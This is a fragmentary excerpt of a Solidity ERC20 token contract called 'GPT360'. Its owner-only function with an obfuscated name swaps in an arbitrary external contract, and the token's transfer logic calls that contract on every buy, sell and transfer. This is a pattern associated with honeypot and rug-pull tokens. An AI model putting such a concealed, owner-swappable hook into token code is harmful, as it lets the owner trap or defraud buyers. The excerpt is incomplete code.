...
contract TokenM is ERC20 {
    ...
    IUserAmounttufrcc public tufrcc;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("GPT360", "G360") {
    ...
    function chuiheelBrtongRssud(IUserAmounttufrcc _tufrcc) public onlyOwner {
        tufrcc = _tufrcc;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                tufrcc.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				tufrcc.addOutAmount(from, amount);
            }else{
                tufrcc.addOutAmount(from, amount);
                takeFee = false;
            }
